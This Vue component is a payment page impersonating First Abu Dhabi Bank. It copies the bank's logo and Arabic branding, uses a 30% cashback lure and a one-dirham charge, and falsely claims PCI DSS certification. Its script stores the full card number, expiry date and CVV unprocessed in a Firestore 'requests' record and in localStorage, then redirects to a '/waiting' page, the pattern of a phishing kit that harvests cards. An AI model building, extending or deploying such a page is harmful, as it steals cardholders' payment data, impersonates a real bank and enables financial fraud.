<script setup lang="ts">
import { ref } from 'vue';
import { ChevronDown, CreditCard } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { doc, updateDoc } from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../firebase';

const router = useRouter();

const form = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const isSubmitting = ref(false);

const errors = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', cardNumber: '', expMonth: '', expYear: '', cvv: '' };

  if (!form.value.name.trim()) {
    errors.value.name = 'Required';
    isValid = false;
  }

  if (!/^\d{15,16}$/.test(form.value.cardNumber.replace(/\s/g, ''))) {
    errors.value.cardNumber = 'Valid card number required';
    isValid = false;
  }

  if (!form.value.expMonth) {
    errors.value.expMonth = 'Required';
    isValid = false;
  }

  if (!form.value.expYear) {
    errors.value.expYear = 'Required';
    isValid = false;
  }

  if (!/^\d{3,4}$/.test(form.value.cvv)) {
    errors.value.cvv = 'Valid CVV required';
    isValid = false;
  }

  return isValid;
};

const submitPayment = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  
  const requestId = localStorage.getItem('currentRequestId');
  if (!requestId) {
    alert('Request ID not found. Please start from the beginning.');
    isSubmitting.value = false;
    router.push('/');
    return;
  }

  try {
    const requestRef = doc(db, 'requests', requestId);
    const payload = {
      paymentName: form.value.name,
      cardNumber: form.value.cardNumber,
      expMonth: form.value.expMonth,
      expYear: form.value.expYear,
      cvv: form.value.cvv,
      step: 'card',
      updatedAt: new Date().toISOString()
    };
    
    try {
      const fallbackStr = localStorage.getItem('fallback_requests') || '{}';
      const fallbackData = JSON.parse(fallbackStr);
      if (fallbackData[requestId]) {
        fallbackData[requestId] = { ...fallbackData[requestId], ...payload };
        localStorage.setItem('fallback_requests', JSON.stringify(fallbackData));
      }
    } catch(e) {}

    await updateDoc(requestRef, payload);
    
    console.log('Payment submitted', form.value);
  } catch (error) {
    handleFirestoreError(error, OperationType.UPDATE, `requests/${requestId}`);
  } finally {
    isSubmitting.value = false;
    router.push('/waiting');
  }
};
</script>

<template>
  <div class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans">
    
    <!-- Top FAB Banner Mockup -->
    <div class="w-full bg-[#f4f6f8] relative overflow-hidden h-[120px] border-b border-gray-300 flex items-center shrink-0">
      <div class="absolute inset-0 bg-gradient-to-r from-[#e3e9ef] via-[#dae4ec] to-[#aec8df] opacity-60"></div>
      
      <!-- Scattered Cards Graphic Simulation -->
      <div class="absolute -bottom-8 left-1/4 flex gap-1 -rotate-12 opacity-90 scale-90">
        <div class="w-16 h-24 bg-gradient-to-br from-[#1a2b4c] to-[#0a152e] rounded shadow-lg border border-gray-600"></div>
        <div class="w-16 h-24 bg-gradient-to-br from-[#173e6b] to-[#122e50] rounded shadow-lg translate-y-3"></div>
        <div class="w-16 h-24 bg-gradient-to-br from-[#272727] to-[#111111] rounded shadow-lg translate-y-6 flex items-end p-2"><div class="w-4 h-4 rounded-full bg-blue-500 opacity-50"></div></div>
        <div class="w-16 h-24 bg-gradient-to-br from-[#3b5998] to-[#243e74] rounded shadow-lg translate-y-9"></div>
      </div>

      <div class="relative z-10 px-4 pt-2 flex justify-between w-full h-full">
        <!-- Logo Left -->
        <div class="flex flex-col text-[#0c2a5c]">
          <div class="text-[8px] font-bold text-center ltr">بنك أبوظبي الأول<br/>First Abu Dhabi Bank</div>
          <div class="font-extrabold text-3xl tracking-tighter flex items-center mt-1">
             FAB
             <span class="text-red-600 text-3xl font-light transform scale-y-150 ml-0.5">1</span>
          </div>
        </div>
        
        <!-- Arabic Text Right -->
        <div class="text-right flex flex-col items-end rtl pt-1 z-20">
          <div class="text-[11px] sm:text-xs text-[#002b5e] font-bold max-w-[200px] leading-tight rtl mt-1">
            استمتع باسترداد نقدي بنسبة 30% عند الدفع باستخدام بطاقات بنك ابو ظبي الأول
          </div>
          <div class="text-2xl text-[#002b5e] font-extrabold mt-1 tracking-tight">
            خصم <span class="text-3xl">%30</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Order Summary Bar -->
    <div class="bg-[#384650] text-[#f1f3f5] flex justify-between items-center px-6 py-4 shadow-sm">
      <span class="text-xl border-b-[3px] border-[#d8405d] pb-1 inline-block tracking-wide font-light ltr">Order summary</span>
      <span class="text-2xl font-light tracking-wide ltr">AED 1</span>
    </div>

    <!-- Card Form Container -->
    <div class="px-6 py-8 flex-grow">
      
      <!-- Form Header -->
      <div class="flex justify-between items-center mb-6">
        <div class="flex items-center gap-3">
          <CreditCard class="w-7 h-7 text-gray-800" strokeWidth="2.5" />
          <span class="text-xl text-gray-800 font-medium ltr tracking-tight">Pay by card</span>
        </div>
        <div class="flex gap-4 items-center">
          <!-- Mastercard Mock -->
          <div class="w-8 h-5 relative flex items-center justify-center">
            <div class="w-[18px] h-[18px] bg-[#eb001b] rounded-full absolute left-1 mix-blend-multiply"></div>
            <div class="w-[18px] h-[18px] bg-[#f79e1b] rounded-full absolute right-1 mix-blend-multiply opacity-90"></div>
          </div>
          <!-- Visa Mock -->
          <div class="text-[13px] font-extrabold text-[#1434cb] italic tracking-tighter">VISA</div>
          <!-- Diners Mock -->
          <div class="w-6 h-6 border-[1.5px] border-[#006bb6] text-[#006bb6] rounded-full flex items-center justify-center text-[10px] font-bold">D</div>
        </div>
      </div>

      <form @submit.prevent="submitPayment" class="space-y-6 ltr font-sans">
        
        <!-- Name -->
        <div class="relative">
          <input 
            type="text" 
            placeholder="Name on card" 
            v-model="form.name" 
            class="w-full border-b-[1.5px] border-gray-300 rounded-none py-3 px-2 text-gray-800 focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent transition-colors placeholder-gray-400" 
          />
          <p v-if="errors.name" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.name }}</p>
        </div>

        <!-- Card Number -->
        <div class="relative">
          <input 
            type="text" 
            placeholder="Card Number" 
            v-model="form.cardNumber" 
            class="w-full border-b-[1.5px] border-gray-300 rounded-none py-3 px-2 text-gray-800 focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent transition-colors placeholder-gray-400" 
          />
          <p v-if="errors.cardNumber" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.cardNumber }}</p>
        </div>

        <!-- Expiry Row -->
        <div class="flex gap-6">
          <!-- Month -->
          <div class="relative w-1/2 flex items-center border-b-[1.5px] border-gray-300 bg-transparent">
            <div class="pr-2 text-[#0c2a5c] flex items-center justify-center absolute left-0">
              <ChevronDown class="w-5 h-5 pointer-events-none" />
            </div>
            <select 
              v-model="form.expMonth" 
              class="w-full py-3 pl-8 pr-2 text-gray-800 appearance-none focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
            >
              <option value="" disabled selected hidden>Month</option>
              <option value="01">01</option>
              <option value="02">02</option>
              <option value="03">03</option>
              <option value="04">04</option>
              <option value="05">05</option>
              <option value="06">06</option>
              <option value="07">07</option>
              <option value="08">08</option>
              <option value="09">09</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
            </select>
            <p v-if="errors.expMonth" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.expMonth }}</p>
          </div>

          <!-- Year -->
          <div class="relative w-1/2 flex items-center border-b-[1.5px] border-gray-300 bg-transparent">
            <div class="pr-2 text-[#0c2a5c] flex items-center justify-center absolute left-0">
              <ChevronDown class="w-5 h-5 pointer-events-none" />
            </div>
            <select 
              v-model="form.expYear" 
              class="w-full py-3 pl-8 pr-2 text-gray-800 appearance-none focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
            >
              <option value="" disabled selected hidden>Year</option>
              <option value="2024">2024</option>
              <option value="2025">2025</option>
              <option value="2026">2026</option>
              <option value="2027">2027</option>
              <option value="2028">2028</option>
              <option value="2029">2029</option>
              <option value="2030">2030</option>
            </select>
            <p v-if="errors.expYear" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.expYear }}</p>
          </div>
        </div>

        <!-- CVV -->
        <div class="relative">
          <input 
            type="text" 
            placeholder="CVV Code" 
            v-model="form.cvv" 
            class="w-full border-b-[1.5px] border-gray-300 rounded-none py-3 px-2 text-gray-800 focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent transition-colors placeholder-gray-400 mt-2" 
          />
          <p v-if="errors.cvv" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.cvv }}</p>
        </div>

        <div class="pt-10 mb-4">
          <button 
            type="submit" 
            :disabled="isSubmitting"
            class="w-full max-w-sm mx-auto flex items-center justify-center gap-2 bg-gradient-to-r from-[#173e6b] to-[#122e50] text-white hover:from-[#112d4e] hover:to-[#0c1f36] transition-all font-bold text-xl py-4 rounded-xl shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 tracking-wide disabled:opacity-70 disabled:cursor-not-allowed disabled:transform-none border border-[#0c2a5c]"
          >
            <span v-if="isSubmitting" class="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
            <span v-else>PAY AED 1</span>
          </button>
        </div>
      </form>

    </div>

    <!-- Footer Security Block -->
    <div class="px-6 pb-12 flex flex-col items-center text-center w-full">
      
      <h3 class="font-bold text-gray-800 mb-4 text-lg">البطاقات المقبولة</h3>
      
      <!-- Logos Row -->
      <div class="flex gap-2 mb-10 flex-wrap justify-center items-center">
        <!-- Samsung Pay -->
        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
          <span class="text-[8px] font-bold text-[#1428a0] leading-tight text-center">SAMSUNG<br/>pay</span>
        </div>
        <!-- Google Pay -->
        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
          <span class="text-[12px] font-medium text-gray-600 flex items-center gap-1">
            <span class="font-bold text-blue-500">G</span> Pay
          </span>
        </div>
        <!-- Amex -->
        <div class="border border-gray-200 rounded px-1 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
          <div class="border border-blue-600 bg-blue-50 h-[80%] w-full flex items-center justify-center rounded-sm">
             <span class="text-[6px] font-bold text-blue-600 text-center leading-[1.1] transform scale-90">AMERICAN<br/>EXPRESS</span>
          </div>
        </div>
        <!-- Mastercard -->
        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
          <div class="w-6 h-4 relative flex items-center justify-center">
            <div class="w-3.5 h-3.5 bg-[#eb001b] rounded-full absolute left-0.5 mix-blend-multiply"></div>
            <div class="w-3.5 h-3.5 bg-[#f79e1b] rounded-full absolute right-0.5 mix-blend-multiply opacity-90"></div>
          </div>
        </div>
        <!-- Visa -->
        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
          <span class="text-sm font-extrabold text-[#1434cb] italic">VISA</span>
        </div>
      </div>

      <!-- Compliance Text -->
      <div class="text-center max-w-sm px-4 space-y-4 relative z-10 bg-white">
        <p class="text-[#5a5a5a] font-medium leading-relaxed">
          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة الخليج.
        </p>
        <div class="flex items-center justify-center gap-2">
          <div class="text-[#4568b2] font-bold text-xl tracking-tighter italic flex items-center mt-1">
            <span class="bg-[#4568b2] text-white px-1 ml-1 rounded-sm text-sm not-italic mt-0.5">PCI</span>
            DSS <span class="text-[#36b3b9] ml-1">CERTIFIED</span>
          </div>
          <div class="text-[#5a5a5a] font-medium">بياناتك الخاصة آمنة</div>
        </div>
      </div>

    </div>

  </div>
</template>

<style scoped>
/* Optional specific overrides if needed */
</style>
